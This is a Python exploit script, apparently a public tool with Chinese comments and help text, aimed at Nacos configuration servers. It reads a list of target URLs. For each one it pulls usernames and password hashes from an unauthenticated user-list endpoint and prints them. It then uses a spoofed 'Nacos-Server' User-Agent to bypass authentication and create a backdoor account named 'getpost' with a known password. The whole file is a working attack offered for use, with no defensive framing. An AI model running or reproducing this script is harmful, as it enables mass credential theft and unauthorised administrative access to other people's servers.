import argparse
import re
import requests
import urllib3
urllib3.disable_warnings()

und_path="nacos/v1/auth/users/?pageNo=1&pageSize=9"
adduser_path="nacos/v1/auth/users?username=getpost&password=getpost"


def check_und(txt):   #批量检测
    f = open(txt)
    urllist = f.readlines()
    for url in urllist:
        url=url.replace("\n","")
        # all=url+und_path
        # print(all)
        check_req(url)
        add_user(url)

def check_req(url):   #可以单个检测
    try:
        req = requests.get(url=url+und_path, verify=False, timeout=1)
        text=req.text
        code=req.status_code
        if code==200 and "username" in text:
            req_re_user = re.compile(r'username":"(.*?)","password')
            req_re_pass = re.compile(r'password":"(.*?)"}')
            user_re = req_re_user.findall(text, re.S)
            pass_re=req_re_pass.findall(text, re.S)
            #打印所对应的用户+密码
            print(f"[+]check_url:{url}")
            for i in range(len(user_re)):
                print(f"[+]user{i+1}:{user_re[i]}")
                print(f"[+]pass{i+1}:{pass_re[i]}")
        else:
            print("[-]漏洞不存在")
    except:
        print("异常,请检查你的操作")
#
def add_user(url):
    try:
        header = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Accept-Language': 'en',
            'User-Agent': 'Nacos-Server',
        }
        req=requests.post(url=url+adduser_path, headers=header,verify=False, timeout=2)
        text=req.text
        code=req.status_code
        if "already exist" in text:
            print("[!]用户存在 !!!")
        elif "create user ok" in text and code == 200:
            print("[+]创建 getpost 成功 !!! 密码为：getpost !!!")
    except:
        print("[-]异常,请重新检查!")

def exp_agr():
    parg = argparse.ArgumentParser(description='nacos_check by chaosec')
    parg.add_argument('-u', '--url', dest="url", required=False, type=str)
    parg.add_argument('-c', '--check', dest="check", required=False, type=str)
    parg.add_argument('-a', '--adduser', dest="add", required=False, type=str)
    parg.add_argument('-f', '--file', dest="file", required=False, type=str) #, default='url.txt'
    opt = parg.parse_args()
    return opt

def help():
    a='''
    python nacos_check.py -f url.txt
    检测所有，并且默认添加用户getpost，密码getpost
    
    python nacos_check.py -u target.com --adduser run
    单个网址添加用户
    
    python nacos_check.py -u target.com --check run
    单个网址检测泄露用户
        
            by 欢迎关注chaosec公众号
    '''
    print(a)



if __name__ == '__main__':
        try:
            cmd=exp_agr()
            if cmd.url!=None and cmd.check!=None:
                check_req(cmd.url)
            elif cmd.url!=None and cmd.add!=None:
                add_user(cmd.url)
            elif cmd.file !=None:
                check_und(cmd.file)
            else:
                help()
        except:
            help()


